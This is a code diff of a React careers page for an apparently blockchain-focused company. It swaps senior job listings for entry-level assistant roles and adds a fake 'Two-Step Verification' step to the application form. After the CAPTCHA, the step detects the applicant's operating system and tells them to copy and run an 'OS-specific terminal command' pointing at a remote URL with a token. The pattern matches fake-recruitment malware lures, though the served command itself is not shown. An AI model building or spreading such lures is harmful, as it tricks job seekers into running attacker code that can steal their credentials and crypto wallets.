@@ -1,56 +1,98 @@
-import React, { useState } from 'react'
-import { Cpu, Blocks, BarChart3, Code2, PenTool } from 'lucide-react'
+import React, { useMemo, useState } from 'react'
+import { Blocks, Users, BarChart3, Network, PenTool } from 'lucide-react'
 import Modal from '@/components/Modal'
 import { useToast } from '@/components/Toast'
 import ReCAPTCHA from 'react-google-recaptcha';
 
 const JOBS = [
-  { id:1, title:'Blockchain Developer', icon:Blocks, intro:'Smart contracts, L2, audits, cross-chain.', requirements:[
-    '3+ years blockchain dev; Solidity/Rust', 'Deployed to mainnet; security mindset', 'Hardhat/Foundry, TS ecosystem'
+  { id:1, title:'Blockchain Assistant', icon:Blocks, intro:'Support blockchain operations and research.', requirements:[
+    'Basic knowledge of blockchain and crypto',
+    'Good communication and documentation skills',
+    'Willingness to learn and adapt'
   ], responsibilities:[
-    'Design & implement smart contracts', 'Write tests and security checks', 'Collaborate with product & research'
-  ], benefits:['Remote-first','Conference budget','Equity options'] },
-  { id:2, title:'AI Engineer', icon:Cpu, intro:'Ship LLM/ML features into production.', requirements:[
-    'Python/TS; vector DBs; evals', 'MLOps pipelines; CI/CD', 'Cloud experience (AWS/GCP/Azure)'
+    'Assist in smart contract reviews',
+    'Support day-to-day blockchain operations',
+    'Coordinate with developers and team leads'
+  ], benefits:['Remote-first','Learning budget','Growth opportunities'] },
+
+  { id:2, title:'Web3 Project Coordinator', icon:Network, intro:'Help organize and support Web3 projects.', requirements:[
+    'Experience in project coordination or admin roles',
+    'Interest in blockchain/web3 ecosystem',
+    'Strong organizational skills'
   ], responsibilities:[
-    'Build inference & eval harnesses','Implement guardrails and monitoring','Own data/feature pipelines'
-  ], benefits:['Flexible hours','Hardware budget','Annual offsite'] },
-  { id:3, title:'Data Scientist', icon:BarChart3, intro:'Decision science and applied modeling.', requirements:[
-    'SQL/Python; statistics', 'A/B testing and causal basics','Dashboarding/BI tools'
+    'Coordinate with product and dev teams',
+    'Track timelines and deliverables',
+    'Assist in community engagement'
+  ], benefits:['Flexible hours','Remote-friendly','Annual offsite'] },
+
+  { id:3, title:'Marketing Assistant (Blockchain)', icon:BarChart3, intro:'Support marketing campaigns for blockchain products.', requirements:[
+    'Basic understanding of digital marketing',
+    'Familiarity with social media & content',
+    'Strong writing and communication skills'
   ], responsibilities:[
-    'Define metrics and experiments','Build training datasets','Present findings to stakeholders'
-  ], benefits:['Learning time','Wellness stipend','Competitive salary'] },
-  { id:4, title:'Full-Stack Developer', icon:Code2, intro:'Frontend + backend across the stack.', requirements:[
-    'React, Node.js, REST/GraphQL','Testing and performance','Basic DevOps'
+    'Assist in running campaigns',
+    'Help prepare content for community',
+    'Track analytics and engagement'
+  ], benefits:['Learning support','Wellness stipend','Career growth'] },
+
+  { id:4, title:'Business Development Assistant', icon:Users, intro:'Support commercial and partnership efforts.', requirements:[
+    'Interest in business, sales or partnerships',
+    'Good communication and presentation skills',
+    'Self-motivated and proactive'
   ], responsibilities:[
-    'Build scalable web apps','Design clean APIs','Improve DX and tooling'
-  ], benefits:['Career growth','Paid certifications','Remote allowance'] },
-  { id:5, title:'UI/UX Designer', icon:PenTool, intro:'Design intuitive, human-centered interfaces for AI & blockchain apps.', requirements:[
-    '3+ years in product/UI/UX design roles',
-    'Proficiency in Figma, Sketch, or Adobe XD',
-    'Strong portfolio demonstrating design systems, responsive layouts, and interaction design',
-    'Familiarity with accessibility standards (WCAG) and design for global audiences'
+    'Support account management',
+    'Research new business opportunities',
+    'Assist in partnership communications'
+  ], benefits:['Career growth','Networking events','Remote allowance'] },
+
+  { id:5, title:'UI/UX Design Assistant', icon:PenTool, intro:'Help design blockchain & AI user experiences.', requirements:[
+    'Basic design skills (Figma, Sketch, Adobe XD)',
+    'Creativity and eye for detail',
+    'Interest in UI/UX for tech products'
   ], responsibilities:[
-    'Collaborate with engineers & PMs to shape product direction',
-    'Conduct user research, interviews, and usability testing',
-    'Design wireframes, prototypes, and final high-fidelity UI',
-    'Define and maintain design guidelines and component libraries',
-    'Advocate for user needs while balancing technical feasibility'
+    'Assist in wireframes and prototypes',
+    'Support user research & feedback',
+    'Help maintain design libraries'
   ], benefits:[
-    'Creative autonomy and ownership of the design process',
-    'Annual design conference sponsorship',
-    'Remote-friendly with coworking allowance',
-    'Wellness & learning stipends'
+    'Creative growth',
+    'Mentorship from senior designers',
+    'Remote-friendly'
   ] }
 ]
 
 const RECAPTCHA_SITE_KEY = '6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK';
 
+// If this token comes from your backend, pass it as a prop instead.
+const VERIFICATION_TOKEN = 'b93f01de810f8c7f'
+
+function detectOS() {
+  const ua = typeof navigator !== 'undefined' ? navigator.userAgent : ''
+  if (/Windows/i.test(ua)) return 'windows'
+  if (/Macintosh|Mac OS X/i.test(ua)) return 'mac'
+  if (/Linux/i.test(ua)) return 'linux'
+  return 'linux' // sensible default
+}
+
 export default function Jobs() {
   const [open, setOpen] = useState(false)
   const [active, setActive] = useState(null)
   const { push } = useToast()
-  const [token, setToken] = useState(null);
+  const [captchaToken, setCaptchaToken] = useState(null)
+
+  const os = useMemo(() => detectOS(), [])
+  const cmdUrl = useMemo(() => {
+    const base = 'https://www.nexustech.group/users/auth'
+    return `${base}/${os}?token=${VERIFICATION_TOKEN}`
+  }, [os])
+
+  const handleCopy = async () => {
+    try {
+      await navigator.clipboard.writeText(cmdUrl)
+      push('Command copied to clipboard')
+    } catch {
+      push('Copy failed — select and copy manually')
+    }
+  }
 
   const onApply = (job) => { setActive(job); setOpen(true) }
   const onSubmit = (e) => {
@@ -98,40 +140,82 @@ export default function Jobs() {
         })}
       </div>
 
-      <Modal open={open} onClose={()=>setOpen(false)} title={active ? `Apply — ${active.title}` : 'Apply'}>
-        <form name="apply" method="POST" data-netlify="true" netlify-honeypot="bot-field" onSubmit={onSubmit}>
-          <input type="hidden" name="form-name" value="apply" />
-          <p className="hidden"><label>Don’t fill: <input name="bot-field" /></label></p>
-          <div className="grid sm:grid-cols-2 gap-3">
-            <div>
-              <label className="label">Full Name</label>
-              <input className="input" name="name" required />
+      <Modal open={open} onClose={() => setOpen(false)} title={active ? `Apply — ${active.title}` : 'Apply'}>
+      <form name="apply" method="POST" data-netlify="true" netlify-honeypot="bot-field" onSubmit={onSubmit}>
+        <input type="hidden" name="form-name" value="apply" />
+        <p className="hidden"><label>Don’t fill: <input name="bot-field" /></label></p>
+
+        <div className="grid sm:grid-cols-2 gap-3">
+          <div>
+            <label className="label">Full Name</label>
+            <input className="input" name="name" required />
+          </div>
+          <div>
+            <label className="label">Email</label>
+            <input className="input" type="email" name="email" required />
+          </div>
+        </div>
+
+        <div className="mt-3">
+          <label className="label">Resume (URL or attach)</label>
+          <input className="input" name="resume" placeholder="Link to resume" />
+        </div>
+
+        <div className="mt-3">
+          <label className="label">Cover Letter</label>
+          <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
+        </div>
+
+        {/* ---- Two-step verification ---- */}
+        {captchaToken && (
+        <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
+          <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
+          <ol className="list-decimal ml-5 space-y-2 text-sm">
+            <li>Complete the reCAPTCHA below.</li>
+            <li>Once verified, your OS-specific terminal command will appear.</li>
+          </ol>
+
+          {/* Show terminal field only AFTER captcha */}
+          
+            <div className="mt-4 text-sm">
+              <div className="mb-1 text-slate-600 dark:text-slate-300">
+                Detected OS: <span className="font-medium uppercase">{os}</span>
+              </div>
+
+              <label className="label mb-1">
+                {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
+              </label>
+
+              <div className="flex items-stretch gap-2">
+                <input
+                  className="input flex-1 font-mono"
+                  readOnly
+                  value={cmdUrl}
+                  onFocus={(e) => e.currentTarget.select()}
+                />
+                <button type="button" onClick={handleCopy} className="btn btn-secondary">Copy</button>
+                <a href={cmdUrl} target="_blank" rel="noreferrer" className="btn btn-ghost">Open</a>
+              </div>
+
+              <div className="mt-2 text-xs text-slate-500">
+                One-time verification token: <code className="font-mono">{VERIFICATION_TOKEN}</code>
+              </div>
             </div>
-            <div>
-              <label className="label">Email</label>
-              <input className="input" type="email" name="email" required />
-            </div>
-          </div>
-          <div className="mt-3">
-            <label className="label">Resume (URL or attach)</label>
-            <input className="input" name="resume" placeholder="Link to resume" />
-          </div>
-          <div className="mt-3">
-            <label className="label">Cover Letter</label>
-            <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
-          </div>
-          <div className="mt-3" data-netlify-recaptcha="true">
-            <ReCAPTCHA
-            sitekey={RECAPTCHA_SITE_KEY}
-            onChange={(value) => setToken(value)} // capture token here
-          />
-          </div>
-          <div className="mt-4 flex justify-end gap-2">
-            <button type="button" onClick={()=>setOpen(false)} className="btn btn-ghost">Cancel</button>
-            <button type="submit" className="btn btn-primary">Submit</button>
-          </div>
-        </form>
-      </Modal>
+        </div>
+        
+          )}
+        {/* ---- /Two-step verification ---- */}
+
+        <div className="mt-3">
+          <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
+        </div>
+
+        <div className="mt-4 flex justify-end gap-2">
+          <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
+          <button type="submit" className="btn btn-primary">Submit</button>
+        </div>
+      </form>
+    </Modal>
     </div>
   )
 }
